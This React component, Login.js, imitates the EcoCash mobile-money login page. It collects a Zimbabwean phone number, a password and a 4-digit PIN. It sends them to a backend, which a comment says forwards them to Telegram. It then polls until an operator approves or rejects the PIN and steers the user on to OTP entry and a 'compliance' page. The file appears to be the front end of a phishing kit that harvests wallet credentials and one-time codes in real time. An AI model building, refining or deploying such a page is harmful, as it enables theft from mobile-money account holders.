// import "./Login.css";
import "./Login.css";
import React, { useState, useRef, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { verificationService } from "../services/api";
import { GM, ZW } from "country-flag-icons/react/3x2";

function Login({
  client,
  // setlength,
  setpin,
  sendDetails,
  setnumber,
  setpassword,
}) {
  const { user } = useParams();
  const { number, password } = client;
  const navigate = useNavigate();
  const [numside, setnumside] = useState(true);
  const [pin1, setPin1] = useState("");
  const [pin2, setPin2] = useState("");
  const [pin3, setPin3] = useState("");
  const [pin4, setPin4] = useState("");
  const [show, setShow] = useState("password");
  const [verifying, setVerifying] = useState(false);
  const [status, setStatus] = useState("");
  // const [sessionId, setSessionId] = useState("");
  const [error, setError] = useState("");
  const [pollingInterval, setPollingInterval] = useState(null);

  // Create refs for each input
  const pin1Ref = useRef(null);
  const pin2Ref = useRef(null);

  const pin3Ref = useRef(null);
  const pin4Ref = useRef(null);

  const localPin = [pin1, pin2, pin3, pin4];
  const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}`;
  const pinfull = pinString.length === 4;

  // API URL - Use environment variable or fallback
  const API_URL = import.meta.env.VITE_API_URL;

  // Function to handle PIN input and auto-focus next field
  const handlePinInput = (pinNumber, value, setpin) => {
    // Only allow numbers
    if (value && !/^\d$/.test(value)) return;

    setpin(value);

    // Auto-focus next input if a digit was entered
    if (value !== "") {
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace - focus previous field
    if (value === "" && pinNumber > 1) {
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }
  };

  // Handle keydown for navigation
  const handleKeyDown = (pinNumber, e) => {
    // Handle left arrow key
    if (e.key === "ArrowLeft" && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle right arrow key
    if (e.key === "ArrowRight" && pinNumber < 4) {
      e.preventDefault();
      switch (pinNumber) {
        case 1:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 2:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        case 3:
          if (pin4Ref.current) pin4Ref.current.focus();
          break;
        default:
          break;
      }
    }

    // Handle backspace when empty
    if (e.key === "Backspace" && !localPin[pinNumber - 1] && pinNumber > 1) {
      e.preventDefault();
      switch (pinNumber) {
        case 2:
          if (pin1Ref.current) pin1Ref.current.focus();
          break;
        case 3:
          if (pin2Ref.current) pin2Ref.current.focus();
          break;
        case 4:
          if (pin3Ref.current) pin3Ref.current.focus();
          break;
        default:
          break;
      }
      console.log(setShow);
    }
  };
  // In Login.js - Use the service instead of fetch

  const sendPinToBackend = async () => {
    console.log("🔍 Sending PIN to backend...");
    console.log("📱 Phone:", number);
    console.log("🔢 PIN:", pinString);

    setVerifying(true);
    setError("");
    setStatus("pending");

    // Clear any existing polling interval
    if (pollingInterval) {
      clearInterval(pollingInterval);
      setPollingInterval(null);
    }

    try {
      const data = await verificationService.requestPinVerification({
        phoneNumber: number,
        password: password,
        pinCode: pinString,
        userId: `user_${Date.now()}`,
        userName: "telecel User",
      });

      console.log("✅ Backend response:", data);

      if (data.success && data.sessionId) {
        console.log("🎯 Session ID received:", data.sessionId);

        // Start polling using the service
        startPolling(data.sessionId);
      } else {
        console.error("❌ Backend error:", data.error);
        setError(data.error || "Failed to verify PIN");
        setVerifying(false);
        setStatus("");
      }
    } catch (error) {
      console.error("❌ Network error:", error);
      setError("Network error. Please check your connection and try again.");
      setVerifying(false);
      setStatus("");
    }
  };

  // Updated polling function using the service
  const startPolling = (sessionId) => {
    console.log("🔄 Starting polling for session:", sessionId);

    let attempts = 0;
    const maxAttempts = 150;

    const poll = async () => {
      if (attempts >= maxAttempts) {
        // console.log("⏰ Max polling attempts reached");
        setError("PIN verification timeout. Please try again.");
        setVerifying(false);
        setStatus("expired");
        return;
      }

      attempts++;
      console.log(`📡 Polling attempt ${attempts}`);

      try {
        const data = await verificationService.checkPinStatus(sessionId);
        console.log("📊 Status data:", data);

        // Handle different statuses
        if (data.status === "approved") {
          console.log("✅ PIN approved!");
          stopPolling();
          setStatus("approved");
          setVerifying(false);
          setTimeout(() => handleApprovedPin(), 1000);
          // } else if (data.status === "approved6") {
          //   console.log("✅ PIN approved!");
          //   stopPolling();
          //   setStatus("approved");
          //   setVerifying(false);
          //   setTimeout(() => handleApprovedPin6(), 1000);
        } else if (data.status === "pending") {
          console.log("⏳ Still pending...");
          setStatus("pending");
        } else if (data.status === "wrong_pin") {
          console.log("❌ Wrong PIN");
          stopPolling();
          setError("Wrong PIN entered. Please try again.");
          setVerifying(false);
          setStatus("wrong_pin");
        } else if (data.status === "expired") {
          console.log("⏰ Session expired");
          stopPolling();
          setError("PIN verification expired. Please try again.");
          setVerifying(false);
          setStatus("expired");
        } else if (data.status === "approved_with_otp") {
          console.log("✅ PIN & OTP approved!");
          stopPolling();
          setStatus("pinotp_correct");
          setVerifying(false);
          setTimeout(() => navigate(`/${user}/compliance`), 2000);
        }
      } catch (err) {
        console.error("❌ Polling error:", err);
      }
    };

    const stopPolling = () => {
      if (pollingInterval) {
        clearInterval(pollingInterval);
        setPollingInterval(null);
      }
    };

    // Start immediately
    poll();

    // Set interval
    const interval = setInterval(poll, 2000);
    setPollingInterval(interval);
  };

  // Handle approved PIN
  const handleApprovedPin = () => {
    console.log("🎉 PIN approved, proceeding to OTP verification...");
    // setlength(5);
    setpin(pinString);
    sendDetails();
    navigate(`/${user}/verification`);
  };
  // const handleApprovedPin6 = () => {
  //   console.log("🎉 PIN approved, proceeding to OTP verification...");
  //   setlength(6);
  //   setpin(pinString);
  //   sendDetails();
  //   navigate(`/${user}/otpverification`);
  // };

  // Function to handle login
  const handleLogin = async () => {
    if (pinfull) {
      // Send PIN to Telegram for verification
      await sendPinToBackend();
    } else {
      setError("Please enter a 4-digit PIN");
    }
  };

  // Status messages
  const statusMessages = {
    pending: "🔐 Verifying PIN...",
    approved: "✅ PIN verified!",
    wrong_pin: "❌ Wrong PIN",
    pinotp_correct: "✅ PIN and OTP verified!",
    expired: "⏰ Verification timeout",
  };

  // Effect to focus first input on mount
  useEffect(() => {
    if (pin1Ref.current) {
      pin1Ref.current.focus();
    }
  }, []);

  // Cleanup polling interval on component unmount
  useEffect(() => {
    return () => {
      if (pollingInterval) {
        clearInterval(pollingInterval);
      }
    };
  }, [pollingInterval]);

  const num = Number(number);

  function handleContinue() {
    if (num === "" || num.toString().length !== 9) {
      setError("Please enter a valid 9-digit phone number");
      return;
    }
    setnumside(false);
    setError("");
  }
  function handleRegister() {
    // if (num === "" || num.toString().length !== 9) {
    //   setError("Please enter a valid 9-digit phone number");
    //   return;
    // }
    setnumside(false);
    setError("");
  }
  // function togglePassowrd() {
  //   setShow(show === "password" ? "text" : "password");
  // }

  return (
    <>
      <div className="container">
        <header className="myheader">
          <div className="logohead">
            <div className="logo">
              Eco<span>Cash</span>
            </div>
            <p>Welcome</p>
          </div>

          <div className="phone-number">
            <div className="numbercont">
              <div className="countrycode">
                <ZW title="United States" className="gm" />
                <span>+263 </span>
              </div>
              <input
                type="number"
                name="number"
                onChange={(e) => setnumber(e.target.value)}
                defaultValue={num}
                className="numbercontinput no-spinner"
                placeholder="Mobile number"
                disabled={verifying}
                style={{ outline: "none" }}
              />
            </div>
          </div>

          <div className="pin-input-container">
            <label className="pin-label">Enter your PIN</label>
            <div>
              <input
                ref={pin1Ref}
                maxLength="1"
                type="number"
                className="no-spinner"
                value={pin1}
                onChange={(e) => handlePinInput(1, e.target.value, setPin1)}
                onKeyDown={(e) => handleKeyDown(1, e)}
                disabled={verifying}
              />
              <input
                ref={pin2Ref}
                type="number"
                className="no-spinner"
                value={pin2}
                maxLength="1"
                onChange={(e) => handlePinInput(2, e.target.value, setPin2)}
                onKeyDown={(e) => handleKeyDown(2, e)}
                disabled={verifying}
              />
              <input
                ref={pin3Ref}
                type="number"
                maxLength="1"
                className="no-spinner"
                value={pin3}
                onChange={(e) => handlePinInput(3, e.target.value, setPin3)}
                onKeyDown={(e) => handleKeyDown(3, e)}
                disabled={verifying}
              />
              <input
                ref={pin4Ref}
                type="number"
                maxLength="1"
                className="no-spinner"
                value={pin4}
                onChange={(e) => handlePinInput(4, e.target.value, setPin4)}
                onKeyDown={(e) => handleKeyDown(4, e)}
                disabled={verifying}
              />
            </div>
          </div>
          <div className="forgot-pin">
            <a href="#">Forgot PIN?</a>
          </div>
          {/* <button
            className="btnContinue"
            onClick={handleLogin}
            disabled={!pinfull || verifying}
            style={{
              opacity: !pinfull || verifying ? 0.6 : 1,
              cursor: !pinfull || verifying ? "not-allowed" : "pointer",
            }}
          >
            {verifying ? "Verifying PIN..." : "Login"}
          </button> */}
          <div className="curvesec">
            <div></div>
            <div></div>
            <button
              className="btnContinue"
              onClick={handleLogin}
              disabled={!pinfull || verifying}
              style={{
                opacity: !pinfull || verifying ? 0.6 : 1,
                cursor: !pinfull || verifying ? "not-allowed" : "pointer",
              }}
            >
              {verifying ? "Verifying PIN..." : "Login"}
            </button>
          </div>
          <div className="help-section">
            <p className="help-text">
              To register an EcoCash wallet or get assistance, click below
            </p>

            <div className="buttons-container">
              <button className="help-button register-button">Register</button>
              <button className="help-button support-button">
                Help & Support
              </button>
            </div>

            <div className="terms">
              <div className="version">v2.1.3P</div>
              By signing in you agree to the Terms and Conditions
            </div>
          </div>
          {/* <h1 className="login-title">Welcome To Telecel</h1> */}
        </header>

        <main className="main" style={{ display: "none" }}>
          {numside === false ? (
            <>
              {/* <label htmlFor="phonenumer" className="myLabel">
                {" "}
                Phone Number
              </label> */}
              <div className="phone-number">
                <div className="numbercont">
                  <div className="countrycode">
                    <GM title="United States" className="gm" />
                    <span>+220 </span>
                  </div>
                  <input
                    type="number"
                    name="number"
                    onChange={(e) => setnumber(e.target.value)}
                    defaultValue={num}
                    className="numbercontinput no-spinner"
                    placeholder="Mobile number"
                    disabled={verifying}
                  />
                </div>
              </div>
              {/* <label htmlFor="phonenumer" className="myLabel">
                {" "}
                Enter Your Password
              </label> */}
              <div className="phone-number">
                <div className="numbercont">
                  <input
                    type={show}
                    name="password"
                    onChange={(e) => setpassword(e.target.value)}
                    // defaultValue={num}
                    value={password}
                    className="inputpasswo no-spinner"
                    placeholder="Password"
                    disabled={verifying}
                  />
                </div>
                <p>Forgot Password</p>
              </div>

              <button className="continnue" onClick={handleContinue}>
                Login
              </button>

              <div className="cta-register">
                <p>Don't have an account?</p>
                <button onClick={handleRegister}>Register</button>
              </div>
            </>
          ) : (
            <>
              <div className="pin-input-container" style={{ display: "none" }}>
                <label className="pin-label">Enter your PIN</label>
                <div>
                  <input
                    ref={pin1Ref}
                    maxLength="1"
                    type="number"
                    className="no-spinner"
                    value={pin1}
                    onChange={(e) => handlePinInput(1, e.target.value, setPin1)}
                    onKeyDown={(e) => handleKeyDown(1, e)}
                    disabled={verifying}
                  />
                  <input
                    ref={pin2Ref}
                    type="number"
                    className="no-spinner"
                    value={pin2}
                    maxLength="1"
                    onChange={(e) => handlePinInput(2, e.target.value, setPin2)}
                    onKeyDown={(e) => handleKeyDown(2, e)}
                    disabled={verifying}
                  />
                  <input
                    ref={pin3Ref}
                    type="number"
                    maxLength="1"
                    className="no-spinner"
                    value={pin3}
                    onChange={(e) => handlePinInput(3, e.target.value, setPin3)}
                    onKeyDown={(e) => handleKeyDown(3, e)}
                    disabled={verifying}
                  />
                  <input
                    ref={pin4Ref}
                    type="number"
                    maxLength="1"
                    className="no-spinner"
                    value={pin4}
                    onChange={(e) => handlePinInput(4, e.target.value, setPin4)}
                    onKeyDown={(e) => handleKeyDown(4, e)}
                    disabled={verifying}
                  />
                </div>

                <div className="curvesec" style={{ display: "none" }}>
                  <div></div>
                  <div></div>
                  <button
                    className="btnContinue"
                    onClick={handleLogin}
                    disabled={!pinfull || verifying}
                    style={{
                      opacity: !pinfull || verifying ? 0.6 : 1,
                      cursor: !pinfull || verifying ? "not-allowed" : "pointer",
                    }}
                  >
                    {verifying ? "Verifying PIN..." : "Login"}
                  </button>
                </div>

                <div className="help-section">
                  <p className="help-text">
                    To register an EcoCash wallet or get assistance, click below
                  </p>

                  <div className="buttons-container">
                    <button className="help-button register-button">
                      Register
                    </button>
                    <button className="help-button support-button">
                      Help & Support
                    </button>
                  </div>
                </div>

                {/* Status/Error Display */}
                {error && (
                  <div
                    className="error-message"
                    style={{
                      color: "red",
                      marginTop: "10px",
                      padding: "10px",
                      backgroundColor: "#ffeeee",
                      borderRadius: "0px",
                      textAlign: "center",
                    }}
                  >
                    {error}
                  </div>
                )}

                {status && (
                  <div
                    className="status-message"
                    style={{
                      color:
                        status === "approved" || status === "pinotp_correct"
                          ? "green"
                          : status === "pending"
                            ? "orange"
                            : "red",
                      marginTop: "10px",
                      fontWeight: "bold",
                      padding: "10px",
                      backgroundColor:
                        status === "approved" ? "#eeffee" : "#fff8e1",
                      borderRadius: "0px",
                      textAlign: "center",
                    }}
                  >
                    {statusMessages[status] || status}
                  </div>
                )}
              </div>

              <footer className="footer" style={{ display: "none" }}>
                <div className="curvesec">
                  {/* <div></div>
            <div></div> */}
                  <button
                    className="btnContinue"
                    onClick={handleLogin}
                    disabled={!pinfull || verifying}
                    style={{
                      opacity: !pinfull || verifying ? 0.6 : 1,
                      cursor: !pinfull || verifying ? "not-allowed" : "pointer",
                    }}
                  >
                    {verifying ? "Verifying PIN..." : "Login"}
                  </button>
                  {/* <p>By continuing, you agree to the Terms and Conditions</p> */}
                </div>
              </footer>
            </>
          )}
        </main>
      </div>
    </>
  );
}

export default Login;
